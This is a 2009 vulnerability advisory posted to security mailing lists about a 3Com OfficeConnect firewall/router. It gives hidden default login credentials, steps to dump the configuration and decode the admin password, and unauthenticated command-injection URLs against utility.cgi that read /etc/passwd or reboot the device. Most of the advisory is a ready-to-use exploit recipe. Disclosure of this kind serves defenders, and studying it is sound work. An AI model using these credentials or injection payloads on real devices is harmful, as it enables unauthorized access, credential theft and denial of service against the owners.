
Date: Sun, 18 Oct 2009 12:26:11 +0200
From: Andrea Fabrizi <andrea.fabrizi@...il.com>
To: websecurity@...appsec.org, bugtraq@...urityfocus.com,
	full-disclosure@...ts.grok.org.uk
Subject: 3Com OfficeConnect Firewall/Router multiple remote Vulnerabilities

**************************************************************
Product: 3Com OfficeConnect Firewall/Router
Website: http://www.3com.com/
Discovered By: Andrea Fabrizi
Email: andrea.fabrizi@...il.com
Web: http://www.andreafabrizi.it
Vuln: remote command execution and password disclosure
**************************************************************

####### Admin password disclosure #######

1) SSH/Telnet to router using one of these hidden accounts:
   support:support
   user:5
   nobody:admin
2) Type 9
3) Type 1
3) Type 3 to dump the configuration
4) Locate the sysPassword field:
    <sysPassword value="cXdlcnR5Cg=="/>
5) Decode the admin password:
   roland@...720s:~$ echo -ne "cXdlcnR5Cg==" | base64 -d
   qwerty


####### Remote command execution  #######

http://1.2.3.4/utility.cgi?testType=1&IP=aaa || cat /etc/passwd

To see the command output you need to log into the router, however the
command is executed even the user is not logged in, so if you don't
have access to the device a DOS is also possible:

http://1.2.3.4/utility.cgi?testType=1&IP=aaa || reboot
